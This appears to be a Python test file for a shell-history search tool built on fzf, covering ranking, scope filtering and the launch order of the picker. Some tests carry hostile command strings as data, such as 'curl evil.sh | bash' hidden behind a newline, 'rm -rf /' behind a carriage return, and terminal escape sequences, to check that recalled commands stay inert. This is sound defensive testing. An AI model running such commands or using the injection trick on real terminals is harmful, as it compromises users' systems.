"""Scope filtering, ranking, and the fzf line format."""

from __future__ import annotations

import io
import os
import sqlite3
import subprocess
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest import mock

from woswoar import search, store
from woswoar.__main__ import main
from woswoar.entry import Entry, format_line

from .support import MACHINE_ID, WoswoarTestCase, requires_fzf

NOW = 1_800_000_000


class TestRelativeTime(unittest.TestCase):
    def test_scales(self) -> None:
        cases = [
            (0, "0s"),
            (45, "45s"),
            (60, "1m"),
            (59 * 60, "59m"),
            (3600, "1h"),
            (23 * 3600, "23h"),
            (86400, "1d"),
            (29 * 86400, "29d"),
            (30 * 86400, "1mo"),
            (349 * 86400, "11mo"),
            (350 * 86400, "1y"),
            (365 * 86400, "1y"),
            (900 * 86400, "2y"),
        ]
        for delta, expected in cases:
            with self.subTest(delta=delta):
                self.assertEqual(search.relative_time(NOW - delta, NOW), expected)

    def test_never_exceeds_the_column_width(self) -> None:
        # command_from_line() slices at a fixed offset, so an over-wide label
        # would silently eat the first characters of the command.
        for delta in [0, 1, 59, 61, 3599, 90000, 86400 * 29, 86400 * 364, 86400 * 365 * 40]:
            with self.subTest(delta=delta):
                self.assertLessEqual(len(search.relative_time(NOW - delta, NOW)), 4)

    def test_clock_skew_from_another_machine_is_tolerated(self) -> None:
        self.assertEqual(search.relative_time(NOW + 500, NOW), "now")


class TestRankRows(unittest.TestCase):
    @staticmethod
    def rows(*pairs: tuple[int, str]) -> tuple[list[str], list[str]]:
        """Stamps come out of the cache as strings, so that is what goes in."""
        return [str(ts) for ts, _ in pairs], [cmd for _, cmd in pairs]

    def test_newest_first(self) -> None:
        stamps, commands = self.rows((1, "old"), (3, "new"), (2, "mid"))
        ranked = search.rank_rows(stamps, commands)
        self.assertEqual([cmd for _, cmd in ranked], ["new", "mid", "old"])

    def test_dedup_keeps_the_most_recent_occurrence(self) -> None:
        stamps, commands = self.rows((1, "git status"), (5, "git status"), (3, "ls"))
        self.assertEqual(search.rank_rows(stamps, commands), [(5, "git status"), (3, "ls")])

    def test_dedup_can_be_disabled(self) -> None:
        stamps, commands = self.rows((1, "ls"), (2, "ls"))
        self.assertEqual(len(search.rank_rows(stamps, commands, dedup=False)), 2)


class TestRenderRoundTrip(unittest.TestCase):
    def test_command_survives_the_display_format(self) -> None:
        commands = [
            "git status",
            "awk -F'\t' '{print $1}'",
            "back\\slash",
            # A literal backslash followed by an escape letter. Without the
            # backslash being escaped, `unescape` reads this back as a real tab
            # and the recalled command is not the one that was recorded.
            "grep 'a\\tb' file",
            "über 😀",
            "x" * 300,
        ]
        lines = search.render_rows([(NOW, cmd) for cmd in commands], now=NOW)

        for line, cmd in zip(lines, commands, strict=True):
            with self.subTest(cmd=cmd):
                # One entry must occupy exactly one line, or fzf would show a
                # multi-line command as several unrelated candidates.
                self.assertNotIn("\n", line)
                self.assertEqual(search.command_from_line(line), cmd)


class TestScope(WoswoarTestCase):
    """Driven through `lines_for`, which is the path Ctrl-R takes.

    These used to call `filter_scope` on a hand-built list. That function is
    gone -- the scopes are answered from the cache's columns now, and `host`
    without looking at a single row, because the host belongs to the file. A
    test of the old helper would have kept passing while the live path did
    something else, which is exactly what happened when this was written.
    """

    def record(self, ts: int, cmd: str, host: str = MACHINE_ID, session: str = "here") -> None:
        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
            handle.write(format_line(Entry(ts, host, session, "/tmp", 0, 0, cmd)) + "\n")

    def setUp(self) -> None:
        super().setUp()
        self.record(1, "mine, this shell")
        self.record(2, "mine, other shell", session="elsewhere")
        self.record(3, "another machine", host="ffffffffffffffff", session="remote")

    @staticmethod
    def commands(scope: search.Scope) -> list[str]:
        return [search.command_from_line(line) for line in search.lines_for(scope)]

    def test_global_keeps_everything(self) -> None:
        self.assertEqual(len(self.commands("global")), 3)

    def test_host_keeps_this_machine(self) -> None:
        self.assertEqual(sorted(self.commands("host")), ["mine, other shell", "mine, this shell"])

    def test_session_keeps_this_shell(self) -> None:
        os.environ["WOSWOAR_SESSION"] = "here"
        self.assertEqual(self.commands("session"), ["mine, this shell"])

    def test_session_without_the_hook_is_empty_not_an_error(self) -> None:
        os.environ.pop("WOSWOAR_SESSION", None)
        self.assertEqual(self.commands("session"), [])


class TestFzfArgv(unittest.TestCase):
    def test_matching_is_restricted_to_the_command_column(self) -> None:
        # Without --nth=2.., a query like "3d" would match the relative-time
        # column and surface unrelated entries.
        self.assertIn("--nth=2..", search._fzf_argv("global", "", True))

    def test_scope_keys_reload_the_right_scope(self) -> None:
        argv = search._fzf_argv("global", "", True)
        binds = " ".join(a for a in argv if a.startswith("--bind="))
        for key, scope in (("ctrl-g", "global"), ("ctrl-h", "host"), ("ctrl-s", "session")):
            self.assertIn(f"{key}:reload(", binds)
            self.assertIn(f"list --scope {scope}", binds)

    def test_no_dedup_propagates_into_the_reload_command(self) -> None:
        argv = search._fzf_argv("global", "", False)
        self.assertIn("--no-dedup", " ".join(a for a in argv if a.startswith("--bind=")))


MINUTE, HOUR, DAY = 60, 3600, 86400

#: The history from the report this came out of, newest first -- which is the
#: order `rank_rows` hands to fzf, so any deviation in the output below is
#: fzf's ranking and nothing else. Every one of these matches "sync" equally
#: well as far as fzf's score is concerned, which is the whole point: with the
#: scores tied, the tiebreak decides the entire list.
SYNC_HISTORY = [
    (3 * MINUTE, "woswoar sync"),
    (15 * MINUTE, "time woswoar sync"),
    (10 * HOUR, "sync"),
    (10 * HOUR, "synci"),
    (10 * HOUR, "atuin sync"),
    (10 * HOUR, "chmod a+x sync_claude_skills.py"),
    (11 * DAY, "sync; echo 3 | sudo tee /proc/sys/vm/drop_caches"),
    (2 * 30 * DAY, "sync_claude_skills.py"),
    (2 * 30 * DAY, "atuin sync -f"),
    (3 * 30 * DAY, "aimgr repo sync"),
    (365 * DAY, "sudo sync; echo 3 > /proc/sys/vm/drop_caches"),
    (365 * DAY, "atuin sync -h"),
    (365 * DAY, "chezmoi sync"),
    (365 * DAY, "time m clean && time m && time sync"),
]


@requires_fzf
class TestRealFzfRanking(unittest.TestCase):
    """The order fzf actually produces, out of the real binary.

    `--filter` does the same match-and-sort without needing a terminal, so this
    drives the argv Ctrl-R uses rather than a copy of it: a change to `--nth` or
    `--tiebreak` reaches this test. Nothing here can be asserted against a
    stand-in -- the behaviour under test is fzf's, not woswoar's.
    """

    def filtered(self, query: str) -> subprocess.CompletedProcess[str]:
        """The fixture through the real fzf, with the real argv."""
        lines = search.render_rows([(NOW - age, cmd) for age, cmd in SYNC_HISTORY], now=NOW)
        # No `check`: 1 means "nothing matched", which one test below wants.
        return subprocess.run(
            [*search._fzf_argv("global", "", True), f"--filter={query}"],
            input="\n".join(lines) + "\n",
            capture_output=True,
            text=True,
        )

    def ordered(self, query: str) -> list[str]:
        completed = self.filtered(query)
        self.assertEqual(completed.returncode, 0, completed.stderr)
        return [search.command_from_line(line) for line in completed.stdout.splitlines()]

    def test_the_newest_match_comes_first(self) -> None:
        self.assertEqual(self.ordered("sync")[0], "woswoar sync")

    def test_an_old_command_does_not_outrank_a_recent_one_for_starting_sooner(self) -> None:
        """The report: a year-old entry above the command actually wanted.

        The pair is chosen so that only the tiebreak can separate them. The
        year-old one matches *earlier* in its line -- offset 5 in `sudo sync`
        against 8 in `woswoar sync` -- so under `begin` it wins however recent
        the other is, and under `index` it cannot.
        """
        order = self.ordered("sync")
        self.assertLess(
            order.index("woswoar sync"),
            order.index("sudo sync; echo 3 > /proc/sys/vm/drop_caches"),
            "a year-old command outranked one from three minutes ago",
        )

    def test_the_width_of_the_time_column_does_not_rank(self) -> None:
        """`atuin sync` and `atuin sync -h` match at the same offset.

        What differs is the column in front: "1y" is right-aligned into four
        characters and so carries one more leading space than "10h". fzf scores
        `begin` as (match offset - leading whitespace), which turned that
        padding into a ranking signal and put the year-old line first.
        """
        order = self.ordered("atuin sync")
        self.assertLess(
            order.index("atuin sync"),
            order.index("atuin sync -h"),
            "the padding of the age column decided the order",
        )

    def test_the_time_column_is_still_not_matched_against(self) -> None:
        """The reason `--nth=2..` is there, asserted through fzf itself.

        `TestFzfArgv` checks the flag is passed; this checks what it buys. "10h"
        is the age of four entries in the fixture and a substring of no command
        in it, so without the flag this query returns them and with it nothing.

        The exit code is asserted too: an fzf that failed to start would also
        print nothing, and this would pass having matched nothing at all.
        """
        completed = self.filtered("10h")
        self.assertEqual(completed.stdout, "", "the relative-time column was matched against")
        self.assertEqual(completed.returncode, 1, f"not fzf's no-match exit: {completed.stderr}")


class TestRecalledCommandIsInert(unittest.TestCase):
    """What leaves the picker must be exactly one command.

    `render` escapes newlines so one entry occupies one display line, and fzf
    clips anything past the window edge. If `command_from_line` turned that
    escape back into a real newline, the buffer would hold a command the picker
    never showed -- and bash runs a multi-line buffer as several commands on a
    single Enter.
    """

    def _round_trip(self, cmd: str) -> str:
        return search.command_from_line(search.render_rows([(NOW, cmd)], now=NOW)[0])

    def test_an_embedded_newline_does_not_become_a_second_command(self) -> None:
        recalled = self._round_trip("echo visible" + " " * 200 + "\ncurl evil.sh | bash")
        self.assertNotIn("\n", recalled)
        self.assertIn("\\ncurl evil.sh | bash", recalled)

    def test_a_carriage_return_cannot_rewrite_the_line(self) -> None:
        self.assertNotIn("\r", self._round_trip("echo one\rrm -rf /"))

    def test_escape_sequences_do_not_reach_the_buffer(self) -> None:
        recalled = self._round_trip("ls -la\x1b[2K\x1b[1Acurl evil|sh")
        self.assertNotIn("\x1b", recalled)
        self.assertEqual(recalled, "ls -la[2K[1Acurl evil|sh")


class TestNoCommandPrintsControlBytes(WoswoarTestCase):
    """The reproduction from #25, driven through the real commands.

    Both a command and a host's name come from whichever machine sent them, so
    both are attacker-influenceable. Asserted on the bytes rather than on a
    rendering: what matters is that nothing reaching a terminal can move its
    cursor.
    """

    HOSTILE_CMD = "ls -la\x1b[2K\x1b[1Acurl evil|sh"
    HOSTILE_NAME = "peer\x1b[2K\x1b[1Aspoofed"

    def setUp(self) -> None:
        super().setUp()
        peer = "badbadbadbadbad0"
        for host, cmd in ((MACHINE_ID, self.HOSTILE_CMD), (peer, "echo hi\x07")):
            day = store.host_dir(host) / "2026-07-29.tsv"
            day.parent.mkdir(parents=True, exist_ok=True)
            day.write_text(
                format_line(Entry(1_784_600_000, host, "s1", "~", 0, 5, cmd)) + "\n",
                encoding="utf-8",
            )
        store.name_file(peer).write_text(self.HOSTILE_NAME + "\n", encoding="utf-8")

    def output_of(self, *argv: str) -> str:
        out = io.StringIO()
        with redirect_stdout(out):
            main(list(argv))
        return out.getvalue()

    def control_bytes(self, text: str) -> list[str]:
        return sorted({c for c in text if (c < " " or c == "\x7f") and c != "\n"})

    def test_list_prints_none(self) -> None:
        text = self.output_of("list", "--scope", "global")
        self.assertIn("curl evil|sh", text, "the command must still be shown")
        self.assertEqual(self.control_bytes(text), [])

    def test_stats_prints_none_for_a_command_or_a_peers_name(self) -> None:
        text = self.output_of("stats")
        self.assertIn("spoofed", text, "the name must still be shown")
        self.assertEqual(self.control_bytes(text), [])

    def test_import_prints_no_control_bytes_for_a_peers_machine_name(self) -> None:
        """atuin keeps every machine it synced with, so these names are foreign.

        The display site the per-site rule had already been forgotten at, which
        is why the command itself is now handled once in the cache instead.
        """
        db = self.root / "history.db"
        conn = sqlite3.connect(db)
        conn.execute(
            "CREATE TABLE history (id text primary key, timestamp integer, duration integer,"
            " exit integer, command text, cwd text, session text, hostname text,"
            " deleted_at integer, author text, intent text)"
        )
        conn.executemany(
            "INSERT INTO history (id, timestamp, duration, exit, command, cwd, session, hostname)"
            " VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            [
                ("a", 1_784_600_000 * 10**9, 10**9, 0, "git status", "/tmp", "s1", "box:me"),
                ("b", 1_784_600_001 * 10**9, 10**9, 0, "ls", "/tmp", "s1", self.HOSTILE_NAME),
            ],
        )
        conn.commit()
        conn.close()

        text = self.output_of("import", "atuin", "--file", str(db))
        self.assertIn("per machine", text, "both machines must be listed")
        self.assertEqual(self.control_bytes(text), [])


if __name__ == "__main__":
    unittest.main()


class TestThePickerAppearsBeforeTheHistoryIsBuilt(WoswoarTestCase):
    """fzf is started first, and fed afterwards.

    Measured on a real 55,000-command atuin history: the picker used to appear
    after 121 ms, because nothing was spawned until every line had been loaded,
    sorted, deduplicated and rendered. Starting fzf first puts it on screen at
    41 ms -- the work is identical, but you spend it looking at the picker
    instead of at nothing.
    """

    def fake_fzf(self, script: str) -> None:
        """Put a stand-in for fzf first on PATH.

        A real fzf needs a terminal, and CI has neither. What is under test is
        woswoar's half of the conversation -- when the process is started, what
        is written to it, and what happens when it leaves early -- so the stand
        -in is the real subprocess boundary with a scripted other end.
        """
        binary = Path(self.root) / "bin" / "fzf"
        binary.parent.mkdir(parents=True, exist_ok=True)
        binary.write_text(f"#!/usr/bin/env python3\n{script}")
        binary.chmod(0o755)
        os.environ["PATH"] = f"{binary.parent}{os.pathsep}{os.environ['PATH']}"

    def some_history(self) -> None:
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(5):
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, f"cmd {i}")))
                handle.write("\n")

    def test_fzf_is_running_before_the_lines_exist(self) -> None:
        """The whole change, stated as an order of events.

        The stand-in is installed even though `Popen` is mocked: `interactive`
        looks fzf up on PATH first and returns early if it is missing, so
        without this the test asserts nothing on any machine that lacks fzf --
        which is every CI runner here, and is exactly how it first went red.
        """
        self.fake_fzf("import sys\n")
        self.some_history()
        order: list[str] = []

        class Spawned:
            def __init__(self, *args: object, **kwargs: object) -> None:
                order.append("picker")
                self.stdin = io.StringIO()
                self.stdout = io.StringIO("")

            def wait(self) -> int:
                return 130  # as Esc does

        def slow_lines(*args: object, **kwargs: object) -> list[str]:
            order.append("history")
            return ["  1s  cmd 0"]

        with (
            mock.patch("subprocess.Popen", Spawned),
            mock.patch.object(search, "lines_for", slow_lines),
        ):
            search.interactive("global")

        self.assertEqual(order, ["picker", "history"], "the picker waited for the history")

    def test_the_lines_reach_fzf(self) -> None:
        self.some_history()
        self.fake_fzf("import sys\nprint(sys.stdin.read().splitlines()[0])\n")
        with redirect_stdout(io.StringIO()):
            chosen = search.interactive("global")
        self.assertEqual(chosen, "cmd 0", "the newest entry did not survive the round trip")

    def test_fzf_leaving_early_is_not_an_error(self) -> None:
        """Selecting the first line the instant it appears closes the pipe
        under us, and the write has to tolerate that at any point.

        The history has to be bigger than a pipe buffer -- 64 KiB on Linux --
        or the write lands in the buffer and returns happily even though
        nothing will ever read it, and this passes with the handling removed.
        Five short lines did exactly that.
        """
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(2000):
                padded = f"cmd {i} " + "x" * 200
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, padded)))
                handle.write("\n")
        self.assertGreater(
            sum(len(line) for line in search.lines_for("global")),
            1 << 16,
            "precondition: more than one pipe buffer of history",
        )
        # Exits without reading stdin at all -- the harshest version.
        self.fake_fzf("import sys\nsys.exit(130)\n")
        with redirect_stdout(io.StringIO()):
            self.assertIsNone(search.interactive("global"))

    def test_a_machine_with_no_history_opens_no_picker(self) -> None:
        """Ctrl-R on a fresh install did nothing, and must keep doing nothing
        rather than opening an empty picker to escape out of.

        The marker is written by the stand-in itself, so this fails if fzf is
        started at all -- asserting on a file nothing ever creates would pass
        either way, which is what the first version of this test did.
        """
        started = Path(self.root) / "fzf-was-started"
        self.fake_fzf(f"import pathlib\npathlib.Path({str(started)!r}).write_text('yes')\n")

        # The stand-in really does write it when it runs, or the test below is
        # asserting the absence of something that never appears anyway.
        subprocess.run([str(Path(self.root) / "bin" / "fzf")], check=True)
        self.assertTrue(started.exists(), "precondition: the marker works")
        started.unlink()

        with redirect_stdout(io.StringIO()):
            self.assertIsNone(search.interactive("global"))
        self.assertFalse(started.exists(), "an empty history opened a picker")

    def test_many_lines_survive_the_chunking(self) -> None:
        """More than one chunk, so the loop runs more than once."""
        with store.private_append(store.log_file(MACHINE_ID, "2023-11-14")) as handle:
            for i in range(search._CHUNK * 2 + 7):
                handle.write(format_line(Entry(NOW - i, MACHINE_ID, "s1", "~", 0, 1, f"cmd {i}")))
                handle.write("\n")
        self.fake_fzf("import sys\nseen = sys.stdin.read().splitlines()\nprint(seen[-1])\n")
        with redirect_stdout(io.StringIO()):
            chosen = search.interactive("global")
        self.assertEqual(chosen, f"cmd {search._CHUNK * 2 + 6}", "a chunk went missing")
